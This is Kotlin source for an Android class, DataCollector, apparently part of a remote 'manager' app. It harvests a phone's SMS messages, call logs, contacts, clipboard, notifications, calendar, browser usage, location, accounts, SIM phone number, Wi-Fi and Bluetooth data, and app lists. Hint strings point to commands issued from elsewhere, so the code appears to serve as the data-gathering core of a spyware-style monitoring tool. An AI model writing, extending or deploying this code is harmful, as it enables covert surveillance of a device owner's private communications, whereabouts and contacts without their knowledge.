package com.abuzahra.manager.executor

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.*
import android.telephony.TelephonyManager
import android.util.Log
import com.abuzahra.manager.Config
import com.abuzahra.manager.executor.MonitorExecutor
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*

object DataCollector {

    private const val TAG = "DataCollector"

    // ===== SMS =====
    fun getSMS(context: Context): List<Map<String, Any>> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val uri = Telephony.Sms.CONTENT_URI
            val projection = arrayOf(
                Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY,
                Telephony.Sms.DATE, Telephony.Sms.TYPE, Telephony.Sms.READ
            )
            val sortOrder = "${Telephony.Sms.DATE} DESC"

            context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < 200) {
                    list.add(mapOf(
                        "id" to cursor.getLong(0),
                        "address" to (cursor.getString(1) ?: ""),
                        "body" to (cursor.getString(2) ?: ""),
                        "date" to formatDate(cursor.getLong(3)),
                        "type" to smsType(cursor.getInt(4)),
                        "read" to (cursor.getInt(5) == 1)
                    ))
                    count++
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "SMS permission denied", e)
        } catch (e: Exception) {
            Log.e(TAG, "getSMS error", e)
        }
        return list
    }

    private fun smsType(type: Int): String = when (type) {
        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
        Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
        else -> "unknown"
    }

    // ===== CALLS =====
    fun getCalls(context: Context): List<Map<String, Any>> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val uri = CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE
            )
            val sortOrder = "${CallLog.Calls.DATE} DESC"

            context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count < 200) {
                    list.add(mapOf(
                        "id" to cursor.getLong(0),
                        "number" to (cursor.getString(1) ?: "unknown"),
                        "name" to (cursor.getString(2) ?: ""),
                        "date" to formatDate(cursor.getLong(3)),
                        "duration" to "${cursor.getLong(4)} sec",
                        "type" to callType(cursor.getInt(5))
                    ))
                    count++
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Calls permission denied", e)
        } catch (e: Exception) {
            Log.e(TAG, "getCalls error", e)
        }
        return list
    }

    private fun callType(type: Int): String = when (type) {
        CallLog.Calls.INCOMING_TYPE -> "incoming"
        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
        CallLog.Calls.MISSED_TYPE -> "missed"
        CallLog.Calls.REJECTED_TYPE -> "rejected"
        else -> "unknown"
    }

    // ===== CONTACTS =====
    fun getContacts(context: Context): List<Map<String, Any>> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            // Batch query all phone numbers upfront to avoid N+1 queries
            val phoneMap = mutableMapOf<String, MutableList<String>>()
            context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.CONTACT_ID, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )?.use { pc ->
                val idCol = pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                val numCol = pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (pc.moveToNext()) {
                    val contactId = pc.getString(idCol)
                    val number = pc.getString(numCol)
                    phoneMap.getOrPut(contactId) { mutableListOf() }.add(number)
                }
            }

            // Batch query all emails upfront
            val emailMap = mutableMapOf<String, MutableList<String>>()
            context.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Email.CONTACT_ID, ContactsContract.CommonDataKinds.Email.DATA),
                null, null, null
            )?.use { ec ->
                val idCol = ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.CONTACT_ID)
                val dataCol = ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA)
                while (ec.moveToNext()) {
                    val contactId = ec.getString(idCol)
                    val email = ec.getString(dataCol)
                    emailMap.getOrPut(contactId) { mutableListOf() }.add(email)
                }
            }

            // Now iterate contacts and join from maps
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null,
                "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 500) {
                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))

                    list.add(mapOf(
                        "id" to id,
                        "name" to name,
                        "phones" to (phoneMap[id] ?: emptyList()),
                        "emails" to (emailMap[id] ?: emptyList())
                    ))
                    count++
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Contacts permission denied", e)
        } catch (e: Exception) {
            Log.e(TAG, "getContacts error", e)
        }
        return list
    }

    // ===== APPS =====
    fun getApps(context: Context): List<Map<String, Any>> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val pm = context.packageManager
            val packages = pm.getInstalledPackages(0)
            for (pkg in packages) {
                list.add(mapOf(
                    "package" to pkg.packageName,
                    "name" to (pkg.applicationInfo?.loadLabel(pm)?.toString() ?: pkg.packageName),
                    "version" to (pkg.versionName ?: ""),
                    "system" to ((pkg.applicationInfo?.flags ?: 0) and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0),
                    "first_install" to formatDate(pkg.firstInstallTime),
                    "last_update" to formatDate(pkg.lastUpdateTime)
                ))
            }
        } catch (e: Exception) {
            Log.e(TAG, "getApps error", e)
        }
        return list
    }

    // ===== RUNNING APPS =====
    fun getRunningApps(context: Context): List<Map<String, Any>> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val processes = am.runningAppProcesses ?: return list
            val pm = context.packageManager
            for (proc in processes) {
                try {
                    val appInfo = pm.getApplicationInfo(proc.processName, 0)
                    val name = pm.getApplicationLabel(appInfo).toString()
                    list.add(mapOf(
                        "process" to proc.processName,
                        "name" to name,
                        "pid" to proc.pid,
                        "importance" to proc.importance.toString()
                    ))
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "getRunningApps error", e)
        }
        return list
    }

    // ===== DEVICE INFO =====
    fun getDeviceInfo(context: Context): Map<String, Any> {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        return mapOf(
            "device_id" to DeviceUtils.getDeviceId(context),
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "manufacturer" to Build.MANUFACTURER,
            "android" to Build.VERSION.RELEASE,
            "sdk" to Build.VERSION.SDK_INT,
            "serial" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try { Build.getSerial() } catch (_: Exception) { "unknown" }
            } else {
                @Suppress("DEPRECATION") Build.SERIAL ?: "unknown"
            },
            "sim_operator" to (tm?.simOperatorName ?: ""),
            "sim_country" to (tm?.simCountryIso ?: ""),
            "phone_type" to (tm?.phoneType?.toString() ?: ""),
            "network_type" to (tm?.networkType?.toString() ?: ""),
            "screen_width" to (context.resources?.displayMetrics?.widthPixels ?: 0),
            "screen_height" to (context.resources?.displayMetrics?.heightPixels ?: 0),
            "total_memory" to (Runtime.getRuntime().totalMemory() / 1048576),
            "available_memory" to (Runtime.getRuntime().freeMemory() / 1048576),
            "cores" to Runtime.getRuntime().availableProcessors()
        )
    }

    // ===== BATTERY =====
    fun getBattery(context: Context): Map<String, Any> {
        try {
            val filter = android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)
            val battery = context.registerReceiver(null, filter) ?: return mapOf("level" to 0)
            val level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
            val scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
            val percent = if (scale > 0) (level * 100 / scale.toFloat()).toInt() else 0
            val status = when (battery.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)) {
                android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "charging"
                android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "discharging"
                android.os.BatteryManager.BATTERY_STATUS_FULL -> "full"
                android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "not_charging"
                else -> "unknown"
            }
            val plugged = when (battery.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1)) {
                android.os.BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                android.os.BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "wireless"
                else -> "none"
            }
            val temp = battery.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0
            val voltage = battery.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0) / 1000.0
            val health = when (battery.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1)) {
                android.os.BatteryManager.BATTERY_HEALTH_GOOD -> "good"
                android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "overheat"
                android.os.BatteryManager.BATTERY_HEALTH_DEAD -> "dead"
                android.os.BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "over_voltage"
                else -> "unknown"
            }
            return mapOf(
                "level" to percent,
                "status" to status,
                "plugged" to plugged,
                "temperature" to "${temp}C",
                "voltage" to "${voltage}V",
                "health" to health,
                "technology" to (battery.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY) ?: "")
            )
        } catch (e: Exception) {
            return mapOf("level" to 0, "error" to (e.message ?: ""))
        }
    }

    // ===== WIFI INFO =====
    fun getWifiInfo(context: Context): Map<String, Any> {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            val info = wifiManager.connectionInfo
            
            // Get IP using ConnectivityManager (works on all API levels)
            var ip = "0.0.0.0"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val network = cm.activeNetwork
                val linkProps = cm.getLinkProperties(network)
                linkProps?.linkAddresses?.forEach { addr ->
                    if (!addr.address.isLinkLocalAddress && addr.address is java.net.Inet4Address) {
                        ip = addr.address.hostAddress ?: "0.0.0.0"
                        return@forEach
                    }
                }
            } else {
                @Suppress("DEPRECATION")
                ip = String.format(
                    "%d.%d.%d.%d",
                    info.ipAddress and 0xff,
                    (info.ipAddress shr 8) and 0xff,
                    (info.ipAddress shr 16) and 0xff,
                    (info.ipAddress shr 24) and 0xff
                )
            }
            
            var ssid = ""
            var bssid = ""
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    try { ssid = info.ssid?.removeSurrounding("\"") ?: "" } catch (_: Exception) {}
                    try { bssid = info.bssid ?: "" } catch (_: Exception) {}
                } else {
                    ssid = "<location permission required>"
                    bssid = "<location permission required>"
                }
            } else {
                try { ssid = info.ssid?.removeSurrounding("\"") ?: "" } catch (_: Exception) {}
                try { bssid = info.bssid ?: "" } catch (_: Exception) {}
            }
            
            mapOf(
                "ssid" to ssid,
                "bssid" to bssid,
                "ip" to ip,
                "rssi" to info.rssi,
                "speed" to info.linkSpeed,
                "frequency" to info.frequency,
                "network_id" to info.networkId,
                "enabled" to wifiManager.isWifiEnabled
            )
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: "Unable to get WiFi info"))
        }
    }

    // ===== NETWORK INFO =====
    fun getNetworkInfo(context: Context): Map<String, Any> {
        return try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = cm.activeNetwork
                val caps = cm.getNetworkCapabilities(network)
                val connected = caps != null && caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
                var type = "none"
                if (caps != null) {
                    when {
                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> type = "WIFI"
                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> type = "MOBILE"
                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) -> type = "ETHERNET"
                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_BLUETOOTH) -> type = "BLUETOOTH"
                        caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) -> type = "VPN"
                    }
                }
                mapOf(
                    "connected" to connected,
                    "type" to type,
                    "subtype" to "",
                    "roaming" to false
                )
            } else {
                @Suppress("DEPRECATION")
                val activeNetwork = cm.activeNetworkInfo
                mapOf(
                    "connected" to (activeNetwork?.isConnected ?: false),
                    "type" to (activeNetwork?.typeName ?: "none"),
                    "subtype" to (activeNetwork?.subtypeName ?: ""),
                    "roaming" to (activeNetwork?.isRoaming ?: false)
                )
            }
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: ""))
        }
    }

    // ===== SIM INFO =====
    fun getSimInfo(context: Context): Map<String, Any> {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        return mapOf(
            "sim_state" to (tm?.simState?.toString() ?: ""),
            "operator" to (tm?.simOperatorName ?: ""),
            "operator_code" to (tm?.simOperator ?: ""),
            "country" to (tm?.simCountryIso ?: ""),
            "phone_number" to try {
                @Suppress("DEPRECATION")
                (tm?.line1Number ?: "")
            } catch (_: Exception) { "" },
            "network_name" to (tm?.networkOperatorName ?: "")
        )
    }

    // ===== STORAGE INFO =====
    fun getStorageInfo(context: Context): List<Map<String, Any>> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val stat = android.os.Environment.getDataDirectory()
            val statFs = android.os.StatFs(stat.absolutePath)
            val total = statFs.totalBytes / (1024.0 * 1024.0 * 1024.0)
            val available = statFs.availableBytes / (1024.0 * 1024.0 * 1024.0)
            val used = total - available
            list.add(mapOf(
                "type" to "Internal",
                "total" to "%.2f GB".format(total),
                "used" to "%.2f GB".format(used),
                "available" to "%.2f GB".format(available),
                "percent_used" to "%.1f".format(used / total * 100)
            ))

            // External storage
            val externalDirs = context.getExternalFilesDirs(null)
            if (externalDirs.size > 1 && !externalDirs[1].path.contains("emulated")) {
                val extStat = android.os.StatFs(externalDirs[1].path)
                val extTotal = extStat.totalBytes / (1024.0 * 1024.0 * 1024.0)
                val extAvail = extStat.availableBytes / (1024.0 * 1024.0 * 1024.0)
                list.add(mapOf(
                    "type" to "External (SD)",
                    "total" to "%.2f GB".format(extTotal),
                    "used" to "%.2f GB".format(extTotal - extAvail),
                    "available" to "%.2f GB".format(extAvail),
                    "percent_used" to "%.1f".format((extTotal - extAvail) / extTotal * 100)
                ))
            }
        } catch (e: Exception) {
            Log.e(TAG, "getStorageInfo error", e)
        }
        return list
    }

    // ===== CLIPBOARD =====
    fun getClipboard(context: Context): String {
        try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = cm.primaryClip
            return clip?.getItemAt(0)?.text?.toString() ?: ""
        } catch (e: Exception) {
            return "Error: ${e.message}"
        }
    }

    // ===== NOTIFICATIONS =====
    fun getRecentNotifications(context: Context): List<Map<String, Any>> {
        val history = MonitorExecutor.getNotificationHistory()
        return if (history.isNotEmpty()) {
            history
        } else {
            listOf(mapOf("message" to "Notification access requires NotificationListenerService", "hint" to "Ensure MyNotificationListenerService is enabled in Settings > Accessibility"))
        }
    }

    // ===== CALENDAR =====
    fun getCalendar(context: Context): List<Map<String, Any>> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val uri = CalendarContract.Events.CONTENT_URI
            val projection = arrayOf(
                CalendarContract.Events._ID, CalendarContract.Events.TITLE,
                CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
                CalendarContract.Events.DTEND, CalendarContract.Events.EVENT_LOCATION
            )
            val now = System.currentTimeMillis()
            val selection = "${CalendarContract.Events.DTEND} > ?"
            val selectionArgs = arrayOf(now.toString())

            context.contentResolver.query(uri, projection, selection, selectionArgs, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    list.add(mapOf(
                        "id" to cursor.getLong(0),
                        "title" to (cursor.getString(1) ?: ""),
                        "description" to (cursor.getString(2) ?: ""),
                        "start" to formatDate(cursor.getLong(3)),
                        "end" to formatDate(cursor.getLong(4)),
                        "location" to (cursor.getString(5) ?: "")
                    ))
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Calendar permission denied", e)
        } catch (e: Exception) {
            Log.e(TAG, "getCalendar error", e)
        }
        return list
    }

    // ===== BROWSER HISTORY =====
    fun getBrowserHistory(context: Context): List<Map<String, Any>> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val browserPackages = listOf(
                "com.android.chrome",
                "com.chrome.beta",
                "org.mozilla.firefox",
                "org.mozilla.focus",
                "org.mozilla.firefox_beta",
                "com.sec.android.app.sbrowser",
                "com.opera.browser",
                "com.opera.mini.native",
                "com.microsoft.emmx",
                "com.brave.browser",
                "com.UCMobile.intl",
                "com.android.browser"
            )
            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
                ?: return listOf(mapOf("message" to "UsageStatsManager not available"))
            val endTime = System.currentTimeMillis()
            val startTime = endTime - (7 * 24 * 60 * 60 * 1000L) // last 7 days
            val events = usageStatsManager.queryEvents(startTime, endTime)
            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            val eventList = mutableListOf<Map<String, Any>>()
            while (events.hasNextEvent()) {
                val event = android.app.usage.UsageEvents.Event()
                events.getNextEvent(event)
                // Copy fields into a new map instead of storing the reusable Event object
                eventList.add(mapOf(
                    "packageName" to event.packageName,
                    "eventType" to event.eventType,
                    "timeStamp" to event.timeStamp
                ))
            }
            val recentBrowserEvents = eventList
                .filter { it["packageName"] in browserPackages && it["eventType"] == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED }
                .sortedByDescending { it["timeStamp"] as Long }
                .take(50)
            val pm = context.packageManager
            for (event in recentBrowserEvents) {
                val pkgName = event["packageName"] as String
                val timestamp = event["timeStamp"] as Long
                val appName = try {
                    pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString()
                } catch (_: Exception) { pkgName }
                list.add(mapOf(
                    "package" to pkgName,
                    "app" to appName,
                    "timestamp" to timestamp,
                    "datetime" to sdf.format(Date(timestamp))
                ))
            }
            if (list.isEmpty()) {
                list.add(mapOf("message" to "No recent browser usage found (requires PACKAGE_USAGE_STATS permission)"))
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Browser history permission denied", e)
            return listOf(mapOf("message" to "PACKAGE_USAGE_STATS permission required. Grant it in Settings > Security > Usage Access"))
        } catch (e: Exception) {
            Log.e(TAG, "getBrowserHistory error", e)
            return listOf(mapOf("message" to "Error: ${e.message}"))
        }
        return list
    }

    // ===== LOCATION =====
    fun getLastLocation(context: Context): Map<String, Any> {
        return try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val location = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            if (location != null) {
                mapOf(
                    "lat" to location.latitude,
                    "lon" to location.longitude,
                    "accuracy" to location.accuracy,
                    "speed" to location.speed,
                    "time" to formatDate(location.time)
                )
            } else {
                mapOf("error" to "No last known location")
            }
        } catch (e: SecurityException) {
            mapOf("error" to "Location permission denied")
        } catch (e: Exception) {
            mapOf<String, Any>("error" to (e.message ?: "Unknown error"))
        }
    }

    // ===== WIFI NETWORKS (scan results) =====
    fun getWifiNetworks(context: Context): Map<String, Any> {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            // Permissions: ACCESS_WIFI_STATE; for full scan results on Android 10+ also ACCESS_FINE_LOCATION
            val hasFine = context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            val scanResults = try {
                wifiManager.scanResults ?: emptyList<android.net.wifi.ScanResult>()
            } catch (e: SecurityException) {
                return mapOf(
                    "error" to "SCAN_RESULTS access denied",
                    "hint" to "Grant ACCESS_FINE_LOCATION and trigger a WiFi scan first"
                )
            }
            if (scanResults.isEmpty()) {
                return mapOf(
                    "count" to 0,
                    "message" to "No networks found. Trigger a fresh scan via WifiManager.startScan() (deprecated on Android 11+).",
                    "hint" to "Try toggling WiFi off/on or use get_wifi_info for the connected network."
                )
            }
            val networks = scanResults.take(50).map { sr ->
                mapOf(
                    "ssid" to (sr.SSID ?: ""),
                    "bssid" to (sr.BSSID ?: ""),
                    "capabilities" to (sr.capabilities ?: ""),
                    "frequency" to sr.frequency,
                    "level" to sr.level,
                    "channel" to freqToChannel(sr.frequency),
                    "is_5ghz" to (sr.frequency > 4000)
                )
            }
            mapOf(
                "count" to networks.size,
                "has_fine_location" to hasFine,
                "networks" to networks
            )
        } catch (e: SecurityException) {
            mapOf("error" to "WiFi scan requires ACCESS_WIFI_STATE + ACCESS_FINE_LOCATION: ${e.message}")
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: "Unknown WiFi scan error"))
        }
    }

    private fun freqToChannel(freq: Int): Int {
        return if (freq > 4000) (freq - 5000) / 5 else if (freq > 2400) (freq - 2412) / 5 + 1 else 0
    }

    // ===== SAVED WIFI NETWORKS =====
    fun getWifiSaved(context: Context): Map<String, Any> {
        return try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
            @Suppress("DEPRECATION")
            val configured = try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    // getConfiguredNetworks returns empty list on Android Q+ unless app is DPC/profile owner
                    return mapOf(
                        "error" to "getConfiguredNetworks() returns empty list on Android 10+ for non-system apps",
                        "hint" to "Saved WiFi passwords are stored in wpa_supplicant.conf and require root access. Use 'get_wifi_networks' for nearby networks."
                    )
                }
                wifiManager.configuredNetworks ?: emptyList<android.net.wifi.WifiConfiguration>()
            } catch (e: SecurityException) {
                return mapOf(
                    "error" to "ACCESS_WIFI_STATE permission required: ${e.message}"
                )
            }
            if (configured.isEmpty()) {
                mapOf(
                    "count" to 0,
                    "message" to "No saved networks visible. On Android 10+ this requires device-owner privileges."
                )
            } else {
                val list = configured.map { cfg ->
                    mapOf(
                        "ssid" to (cfg.SSID?.removeSurrounding("\"") ?: ""),
                        "network_id" to cfg.networkId,
                        "priority" to cfg.priority,
                        "status" to when (cfg.status) {
                            android.net.wifi.WifiConfiguration.Status.CURRENT -> "current"
                            android.net.wifi.WifiConfiguration.Status.ENABLED -> "enabled"
                            android.net.wifi.WifiConfiguration.Status.DISABLED -> "disabled"
                            else -> "unknown"
                        },
                        "has_password" to (cfg.preSharedKey?.isNotBlank() == true)
                    )
                }
                mapOf("count" to list.size, "networks" to list)
            }
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: "Unknown WiFi saved error"))
        }
    }

    // ===== BLUETOOTH PAIRED DEVICES =====
    fun getBluetoothPaired(context: Context): Map<String, Any> {
        return try {
            val bluetoothManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? android.bluetooth.BluetoothManager
            val adapter = bluetoothManager?.adapter
                ?: return mapOf("error" to "Bluetooth not supported on this device")
            if (!adapter.isEnabled) {
                return mapOf(
                    "enabled" to false,
                    "message" to "Bluetooth is OFF. Enable it first via 'enable_bluetooth' command.",
                    "count" to 0
                )
            }
            // On Android 12+ BLUETOOTH_CONNECT runtime permission is required
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (context.checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
                    return mapOf(
                        "error" to "BLUETOOTH_CONNECT permission required on Android 12+",
                        "hint" to "Grant BLUETOOTH_CONNECT in app permissions"
                    )
                }
            }
            val bonded = adapter.bondedDevices ?: emptySet<android.bluetooth.BluetoothDevice>()
            val devices = bonded.map { dev ->
                mapOf(
                    "name" to (try { dev.name } catch (_: SecurityException) { "<unknown>" }),
                    "address" to (try { dev.address } catch (_: SecurityException) { "<unknown>" }),
                    "type" to (try {
                        when (dev.bluetoothClass?.majorDeviceClass) {
                            android.bluetooth.BluetoothClass.Device.Major.PHONE -> "PHONE"
                            android.bluetooth.BluetoothClass.Device.Major.AUDIO_VIDEO -> "AUDIO_VIDEO"
                            android.bluetooth.BluetoothClass.Device.Major.COMPUTER -> "COMPUTER"
                            else -> (dev.bluetoothClass?.majorDeviceClass?.toString() ?: "UNKNOWN")
                        }
                    } catch (_: Exception) { "UNKNOWN" })
                )
            }
            mapOf("enabled" to true, "count" to devices.size, "devices" to devices)
        } catch (e: SecurityException) {
            mapOf("error" to "Bluetooth permission denied: ${e.message}")
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: "Bluetooth error"))
        }
    }

    // ===== ACCOUNTS (AccountManager) =====
    fun getAccounts(context: Context): Map<String, Any> {
        return try {
            // GET_ACCOUNTS is runtime permission on Android 6+
            if (context.checkSelfPermission(Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED
                && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return mapOf(
                    "error" to "GET_ACCOUNTS permission not granted",
                    "hint" to "Grant Contacts permission (GET_ACCOUNTS auto-granted with READ_CONTACTS on most devices)"
                )
            }
            val am = android.accounts.AccountManager.get(context)
            val accounts = try {
                am.getAccounts()
            } catch (e: SecurityException) {
                return mapOf("error" to "Accounts access denied: ${e.message}")
            }
            val list = accounts.map { acc ->
                mapOf(
                    "name" to acc.name,
                    "type" to acc.type
                )
            }
            // Group by type for a nicer summary
            val byType = list.groupBy { it["type"] as String }.mapValues { it.value.size }
            mapOf(
                "count" to list.size,
                "accounts" to list,
                "by_type" to byType
            )
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: "Accounts error"))
        }
    }

    // ===== CPU INFO (read /proc/cpuinfo) =====
    fun getCpuInfo(): Map<String, Any> {
        return try {
            val lines = java.io.File("/proc/cpuinfo").readLines()
            val map = mutableMapOf<String, Any>()
            val processors = mutableListOf<Map<String, Any>>()
            var current = mutableMapOf<String, String>()
            for (line in lines) {
                if (line.isBlank()) {
                    if (current.isNotEmpty()) {
                        processors.add(current)
                        current = mutableMapOf()
                    }
                    continue
                }
                val idx = line.indexOf(':')
                if (idx > 0) {
                    val key = line.substring(0, idx).trim()
                    val value = line.substring(idx + 1).trim()
                    current[key] = value
                }
            }
            if (current.isNotEmpty()) processors.add(current)
            map["cores"] = Runtime.getRuntime().availableProcessors()
            map["abi"] = Build.SUPPORTED_ABIS.joinToString(",")
            map["abi_64"] = Build.SUPPORTED_64_BIT_ABIS.joinToString(",")
            map["abi_32"] = Build.SUPPORTED_32_BIT_ABIS.joinToString(",")
            map["processors_count"] = processors.size
            map["processors"] = processors.take(8)
            // Common fields
            val first = processors.firstOrNull()
            if (first != null) {
                first["Processor"]?.let { map["processor"] = it }
                first["Hardware"]?.let { map["hardware"] = it }
                first["model name"]?.let { map["model_name"] = it }
                first["BogoMIPS"]?.let { map["bogomips"] = it }
            }
            map["build_hardware"] = Build.HARDWARE
            @Suppress("DEPRECATION")
            map["legacy_cpu_abi"] = Build.CPU_ABI
            map
        } catch (e: Exception) {
            mapOf(
                "error" to "Failed to read /proc/cpuinfo: ${e.message}",
                "cores" to Runtime.getRuntime().availableProcessors(),
                "abi" to Build.SUPPORTED_ABIS.joinToString(",")
            )
        }
    }

    // ===== MEMORY INFO (system-wide) =====
    fun getMemoryInfo(context: Context): Map<String, Any> {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val memInfo = android.app.ActivityManager.MemoryInfo()
            am.getMemoryInfo(memInfo)
            val runtime = Runtime.getRuntime()
            mapOf(
                "total_ram" to memInfo.totalMem,
                "available_ram" to memInfo.availMem,
                "used_ram" to (memInfo.totalMem - memInfo.availMem),
                "threshold" to memInfo.threshold,
                "low_memory" to memInfo.lowMemory,
                "total_ram_mb" to (memInfo.totalMem / (1024 * 1024)),
                "available_ram_mb" to (memInfo.availMem / (1024 * 1024)),
                "used_ram_mb" to ((memInfo.totalMem - memInfo.availMem) / (1024 * 1024)),
                "jvm_total" to runtime.totalMemory(),
                "jvm_free" to runtime.freeMemory(),
                "jvm_used" to (runtime.totalMemory() - runtime.freeMemory()),
                "jvm_max" to runtime.maxMemory()
            )
        } catch (e: Exception) {
            mapOf("error" to (e.message ?: "Memory info error"))
        }
    }

    // ===== HELPERS =====
    private fun formatDate(timestamp: Long): String {
        if (timestamp <= 0) return ""
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return sdf.format(Date(timestamp))
    }
}
